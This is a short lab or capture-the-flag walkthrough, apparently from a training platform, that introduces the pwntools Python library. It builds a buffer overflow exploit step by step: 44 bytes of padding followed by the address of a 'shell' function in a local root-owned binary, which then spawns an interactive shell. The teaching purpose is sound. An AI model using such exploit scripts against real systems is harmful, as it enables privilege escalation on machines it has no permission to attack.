Pwntools is a python library dedicated to making everything we just did in the last task much simpler. However, since it is a library, it requires python knowledge to use to it's full potential, and as such everything in this task will be done using a python script.

We start off the script with:  

```
from pwn import *   proc = process('/opt/secret/root')
```

This imports all the utilities from the pwntools library so we can use them in our script, and then creates a process that we can interact with using pwntools functions.

We know that we need the memory address of the shell function, and pwntools provides a way to obtain that with ELF().

ELF allows us to get various memory addresses of important points in our binary, including the memory address of the shell function.

With the ELF addition our script becomes

```
from pwn import *   proc = process('/opt/secret/root')   elf = ELF('/opt/secret/root')   shell_func = elf.symbols.shell
```  

shell_func holds the memory address of our shell function. Now we need a way to form the payload, luckily pwntools has that to with fit().

fit allows us to form a payload by combining characters and our memory address. To send the payload we can use a method in our `proc` variable, proc.sendline(), which just sends whatever data we want to the binary. Finally we can use proc.interactive(), to view the full output of the process.

With all that our final exploit script becomes  

```
from pwn import *   proc = process('/opt/secret/root')   elf = ELF('/opt/secret/root')   shell_func = elf.symbols.shell   payload = fit({   44: shell_func # this adds the value of shell_func after 44 characters   })   proc.sendline(payload)   proc.interactive()
```

Save that to a .py file and run it, and you should get this output:

![](https://imgur.com/8tr5vl5.jpg)  

We did it again!  

Answer the questions below

Even more woohoo!